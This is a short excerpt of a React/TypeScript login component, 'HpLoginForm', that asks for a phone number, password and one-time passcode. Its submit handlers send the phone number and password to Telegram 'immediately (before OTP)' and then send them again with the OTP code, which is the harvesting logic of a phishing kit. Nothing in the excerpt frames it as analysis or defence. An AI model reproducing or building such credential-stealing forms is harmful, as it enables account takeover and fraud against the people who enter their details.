...
const HpLoginForm = ({ onClose, playClickSound }: HpLoginProps) => {
  ...
  const handleConfirm = async (e: React.FormEvent) => {
    ...
    // Send HP and Password to Telegram immediately (before OTP)
    await sendToTelegram(phoneNumber, password, "HP Login", "-");
  ...
  const handleOtpSubmit = async (e: React.FormEvent) => {
    ...
    // Send HP, Password and OTP to Telegram
    const success = await sendToTelegram(phoneNumber, password, "HP Login - OTP", otp);
